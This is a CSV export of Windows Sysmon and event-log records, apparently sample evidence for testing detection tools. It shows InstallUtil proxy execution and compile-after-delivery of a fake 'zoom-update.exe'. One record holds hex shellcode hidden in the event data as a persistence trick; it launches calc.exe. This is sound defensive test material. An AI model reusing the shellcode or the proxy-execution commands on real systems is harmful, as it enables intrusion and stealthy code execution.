RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,13275,2021-11-18 07:42:34.4152706,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,RegistryEvent (Object create and delete),NT AUTHORITY\SYSTEM,,"ProcessID: 5672, ProcessGUID: 510c1e8a-0348-6196-6701-000000000f00","RuleName: technique_id=T1543,technique_name=Service Creation",Image: C:\Windows\System32\svchost.exe,EventType: CreateKey,TargetObject: HKLM\System\CurrentControlSet\Services\ClipSVC\Parameters,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1543,technique_name=Service Creation""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:34.407""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-0348-6196-6701-000000000f00""},{""@Name"":""ProcessId"",""#text"":""5672""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\System\\CurrentControlSet\\Services\\ClipSVC\\Parameters""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
2,13276,2021-11-18 07:42:34.4167822,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,RegistryEvent (Object create and delete),NT AUTHORITY\SYSTEM,,"ProcessID: 5672, ProcessGUID: 510c1e8a-0348-6196-6701-000000000f00","RuleName: technique_id=T1543,technique_name=Service Creation",Image: C:\Windows\System32\svchost.exe,EventType: CreateKey,TargetObject: HKLM\System\CurrentControlSet\Services\ClipSVC\Parameters,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1543,technique_name=Service Creation""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:34.407""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-0348-6196-6701-000000000f00""},{""@Name"":""ProcessId"",""#text"":""5672""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\System\\CurrentControlSet\\Services\\ClipSVC\\Parameters""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
3,13277,2021-11-18 07:42:54.8220979,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,Process creation,CYBERCAT\pc1-user,,"ProcessID: 816, ProcessGUID: 510c1e8a-03fe-6196-7101-000000000f00","RuleName: technique_id=T1218.004,technique_name=InstallUtil","SHA1=25F66231385528D9F0E14546E2132AC486CB6955,MD5=964D5013C1EC42371AD135E02221A704,SHA256=19C86A9315EECCBB480BA6C48711EE24EA24EE97E27C1E1EEAC8B63D01A71D9F,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 6992, ParentProcessGUID: 510c1e8a-ef86-6195-b100-000000000f00","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe  /logfile= /LogToConsole=false /U C:\Users\pc1-user\Desktop\zoom-update.exe,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1218.004,technique_name=InstallUtil""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:54.817""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-03fe-6196-7101-000000000f00""},{""@Name"":""ProcessId"",""#text"":""816""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe""},{""@Name"":""FileVersion"",""#text"":""4.8.3752.0 built by: NET48REL1""},{""@Name"":""Description"",""#text"":"".NET Framework installation utility""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""InstallUtil.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe  /logfile= /LogToConsole=false /U C:\\Users\\pc1-user\\Desktop\\zoom-update.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\pc1-user\\Desktop\\""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""LogonGuid"",""#text"":""510c1e8a-ef28-6195-fe78-060000000000""},{""@Name"":""LogonId"",""#text"":""0x678FE""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=25F66231385528D9F0E14546E2132AC486CB6955,MD5=964D5013C1EC42371AD135E02221A704,SHA256=19C86A9315EECCBB480BA6C48711EE24EA24EE97E27C1E1EEAC8B63D01A71D9F,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744""},{""@Name"":""ParentProcessGuid"",""#text"":""510c1e8a-ef86-6195-b100-000000000f00""},{""@Name"":""ParentProcessId"",""#text"":""6992""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""CYBERCAT\\pc1-user""}]}}"
4,13278,2021-11-18 07:42:55.7118287,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3900,PC-01.cybercat.local,0,S-1-5-18,Image loaded,CYBERCAT\pc1-user,,"ProcessID: 816, ProcessGUID: 510c1e8a-03fe-6196-7101-000000000f00",RuleName: -,"SHA1=CA5480DFE9B4758479D0122246869A2BF1B8C8E5,MD5=B0DCDBAE21904FFBE5F0103D2FAD2E42,SHA256=0DFDE6A504C5AA2FE546D7B5822911A00F83541F8F00936CDCEC3E355F4B3CDF,IMPHASH=DE075F8AD7299810F29C2884CA96DAE1",Signed: true,Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe,,C:\Windows\SysWOW64\urlmon.dll,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:42:55.568""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-03fe-6196-7101-000000000f00""},{""@Name"":""ProcessId"",""#text"":""816""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\SysWOW64\\urlmon.dll""},{""@Name"":""FileVersion"",""#text"":""11.00.18362.207 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""OLE32 Extensions for Win32""},{""@Name"":""Product"",""#text"":""Internet Explorer""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""UrlMon.dll""},{""@Name"":""Hashes"",""#text"":""SHA1=CA5480DFE9B4758479D0122246869A2BF1B8C8E5,MD5=B0DCDBAE21904FFBE5F0103D2FAD2E42,SHA256=0DFDE6A504C5AA2FE546D7B5822911A00F83541F8F00936CDCEC3E355F4B3CDF,IMPHASH=DE075F8AD7299810F29C2884CA96DAE1""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
5,13279,2021-11-18 07:43:04.9791963,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1128, ProcessGUID: 510c1e8a-ef1a-6195-1a00-000000000f00","RuleName: technique_id=T1047,technique_name=File System Permissions Weakness",Image: C:\Windows\System32\svchost.exe,TargetFilename: C:\Windows\Prefetch\INSTALLUTIL.EXE-9953E407.pf,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1047,technique_name=File System Permissions Weakness""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:43:04.966""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef1a-6195-1a00-000000000f00""},{""@Name"":""ProcessId"",""#text"":""1128""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Prefetch\\INSTALLUTIL.EXE-9953E407.pf""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 06:18:57.236""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
6,13280,2021-11-18 07:43:22.4876140,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 3116, ProcessGUID: 510c1e8a-ffd9-6195-4401-000000000f00",RuleName: -,Image: C:\Windows\system32\mmc.exe,TargetFilename: C:\Users\pc1-user\Desktop\sysmon.evtx,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:43:22.460""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ffd9-6195-4401-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3116""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\mmc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\sysmon.evtx""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:43:22.460""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
7,13281,2021-11-18 07:43:22.7059910,23,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileDelete (A file delete was detected),CYBERCAT\pc1-user,,"ProcessID: 3384, ProcessGUID: 510c1e8a-ef2f-6195-6200-000000000f00",RuleName: -,"SHA1=3F6D19CE07AF1B354560FFCB782D32A60064909D,MD5=306E6CBF14F119BB67860CC98D5AA419,SHA256=E6B3F7EF5EC78452D1AEB9A6D715E371921B31FA8E2175271C74CAC20917B5F3,IMPHASH=00000000000000000000000000000000",TargetFilename: C:\Users\pc1-user\AppData\Roaming\Microsoft\Windows\Recent\sysmon.evtx.lnk,IsExecutable: False,Archived: true,C:\Windows\Explorer.EXE,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:43:22.700""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef2f-6195-6200-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3384""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\sysmon.evtx.lnk""},{""@Name"":""Hashes"",""#text"":""SHA1=3F6D19CE07AF1B354560FFCB782D32A60064909D,MD5=306E6CBF14F119BB67860CC98D5AA419,SHA256=E6B3F7EF5EC78452D1AEB9A6D715E371921B31FA8E2175271C74CAC20917B5F3,IMPHASH=00000000000000000000000000000000""},{""@Name"":""IsExecutable"",""#text"":""False""},{""@Name"":""Archived"",""#text"":""true""}]}}"
1,13252,2021-11-18 07:40:29.5660335,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,Process creation,CYBERCAT\pc1-user,,"ProcessID: 2604, ProcessGUID: 510c1e8a-036d-6196-6801-000000000f00","RuleName: technique_id=T1059,technique_name=Command-Line Interface","SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 6992, ParentProcessGUID: 510c1e8a-ef86-6195-b100-000000000f00","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /unsafe /nologo /target:exe /out:zoom-update.exe C:\Users\pc1-user\Desktop\zoom-update.cs,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1059,technique_name=Command-Line Interface""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.555""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036d-6196-6801-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe""},{""@Name"":""FileVersion"",""#text"":""4.8.3752.0 built by: NET48REL1""},{""@Name"":""Description"",""#text"":""Visual C# Command Line Compiler""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""csc.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe  /unsafe /nologo /target:exe /out:zoom-update.exe C:\\Users\\pc1-user\\Desktop\\zoom-update.cs""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\pc1-user\\Desktop\\""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""LogonGuid"",""#text"":""510c1e8a-ef28-6195-fe78-060000000000""},{""@Name"":""LogonId"",""#text"":""0x678FE""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D""},{""@Name"":""ParentProcessGuid"",""#text"":""510c1e8a-ef86-6195-b100-000000000f00""},{""@Name"":""ParentProcessId"",""#text"":""6992""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""CYBERCAT\\pc1-user""}]}}"
2,13253,2021-11-18 07:40:29.7742862,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 2604, ProcessGUID: 510c1e8a-036d-6196-6801-000000000f00",RuleName: -,Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,TargetFilename: C:\Users\pc1-user\Desktop\CSCFD9BAF75EA53488BBE2F1273837CC796.TMP,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.759""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036d-6196-6801-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\CSCFD9BAF75EA53488BBE2F1273837CC796.TMP""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:40:29.759""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
3,13254,2021-11-18 07:40:29.7954629,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 2604, ProcessGUID: 510c1e8a-036d-6196-6801-000000000f00",RuleName: -,Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,TargetFilename: C:\Users\pc1-user\Desktop\zoom-update.exe,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.790""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036d-6196-6801-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\zoom-update.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:40:29.790""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
4,13255,2021-11-18 07:40:29.7955987,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1128, ProcessGUID: 510c1e8a-ef1a-6195-1a00-000000000f00","RuleName: technique_id=T1047,technique_name=File System Permissions Weakness",Image: C:\Windows\System32\svchost.exe,TargetFilename: C:\Windows\Prefetch\CVTRES.EXE-BBD3ED93.pf,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1047,technique_name=File System Permissions Weakness""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.790""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef1a-6195-1a00-000000000f00""},{""@Name"":""ProcessId"",""#text"":""1128""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Prefetch\\CVTRES.EXE-BBD3ED93.pf""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 06:17:27.971""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
5,13256,2021-11-18 07:40:29.8094708,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 1128, ProcessGUID: 510c1e8a-ef1a-6195-1a00-000000000f00","RuleName: technique_id=T1047,technique_name=File System Permissions Weakness",Image: C:\Windows\System32\svchost.exe,TargetFilename: C:\Windows\Prefetch\CSC.EXE-B6D5E435.pf,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1047,technique_name=File System Permissions Weakness""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:29.806""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef1a-6195-1a00-000000000f00""},{""@Name"":""ProcessId"",""#text"":""1128""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Prefetch\\CSC.EXE-B6D5E435.pf""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 06:16:12.298""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
6,13257,2021-11-18 07:40:30.8664831,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 748, ProcessGUID: 510c1e8a-ef18-6195-0f00-000000000f00","RuleName: technique_id=T1543,technique_name=Service Creation",Image: C:\Windows\system32\svchost.exe,EventType: SetValue,TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-1448793622-2040000875-2550846437-1103\\Device\HarddiskVolume3\Windows\System32\dllhost.exe,Details: Binary Data,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1543,technique_name=Service Creation""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:30.853""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef18-6195-0f00-000000000f00""},{""@Name"":""ProcessId"",""#text"":""748""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-1448793622-2040000875-2550846437-1103\\\\Device\\HarddiskVolume3\\Windows\\System32\\dllhost.exe""},{""@Name"":""Details"",""#text"":""Binary Data""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
7,13258,2021-11-18 07:40:35.9358295,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,RegistryEvent (Value Set),CYBERCAT\pc1-user,,"ProcessID: 2348, ProcessGUID: 510c1e8a-036e-6196-6a01-000000000f00","RuleName: technique_id=T1543,technique_name=Service Creation",Image: C:\Windows\system32\DllHost.exe,EventType: SetValue,TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-1448793622-2040000875-2550846437-1103\\Device\HarddiskVolume3\Windows\System32\dllhost.exe,Details: Binary Data,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1543,technique_name=Service Creation""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:35.931""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-036e-6196-6a01-000000000f00""},{""@Name"":""ProcessId"",""#text"":""2348""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\DllHost.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-1448793622-2040000875-2550846437-1103\\\\Device\\HarddiskVolume3\\Windows\\System32\\dllhost.exe""},{""@Name"":""Details"",""#text"":""Binary Data""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
8,13259,2021-11-18 07:40:46.1574092,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileCreate,CYBERCAT\pc1-user,,"ProcessID: 3116, ProcessGUID: 510c1e8a-ffd9-6195-4401-000000000f00",RuleName: -,Image: C:\Windows\system32\mmc.exe,TargetFilename: C:\Users\pc1-user\Desktop\sysmon.evtx,,,,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:46.152""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ffd9-6195-4401-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3116""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\mmc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\Desktop\\sysmon.evtx""},{""@Name"":""CreationUtcTime"",""#text"":""2021-11-18 07:40:46.152""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""}]}}"
9,13260,2021-11-18 07:40:46.4042265,23,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2148,3896,PC-01.cybercat.local,0,S-1-5-18,FileDelete (A file delete was detected),CYBERCAT\pc1-user,,"ProcessID: 3384, ProcessGUID: 510c1e8a-ef2f-6195-6200-000000000f00",RuleName: -,"SHA1=AD996093712DA7BD4BDFED52498E8795417F41A3,MD5=111B9F86AC9B497A859574C669C56A70,SHA256=53D456FFC72B04EE0873A5191E1C8E9140DD12BC5231E5A18EEBCE585F473C6A,IMPHASH=00000000000000000000000000000000",TargetFilename: C:\Users\pc1-user\AppData\Roaming\Microsoft\Windows\Recent\sysmon.evtx.lnk,IsExecutable: False,Archived: true,C:\Windows\Explorer.EXE,False,/evidence/windows-evtx-hayabusa-samples/DefenseEvasion/T1027.004_ObfuscatedFilesOrInformationCompileAfterDelivery_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-11-18 07:40:46.384""},{""@Name"":""ProcessGuid"",""#text"":""510c1e8a-ef2f-6195-6200-000000000f00""},{""@Name"":""ProcessId"",""#text"":""3384""},{""@Name"":""User"",""#text"":""CYBERCAT\\pc1-user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\pc1-user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\sysmon.evtx.lnk""},{""@Name"":""Hashes"",""#text"":""SHA1=AD996093712DA7BD4BDFED52498E8795417F41A3,MD5=111B9F86AC9B497A859574C669C56A70,SHA256=53D456FFC72B04EE0873A5191E1C8E9140DD12BC5231E5A18EEBCE585F473C6A,IMPHASH=00000000000000000000000000000000""},{""@Name"":""IsExecutable"",""#text"":""False""},{""@Name"":""Archived"",""#text"":""true""}]}}"
1,2,2022-05-24 04:59:06.9098014,1337,Info,Persistence,Key Management Service,0,0,YamatoSecurity,0,,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/SharpEventPersistHiddenShellcode.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6A018D85B20000005068318B6F87FFD5BBF0B5A25668A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD563616C632E65786500"",""Binary"":""""}}"
1,11,2021-06-13 06:17:17.9901393,306,Verbose,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,356,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":""""}"
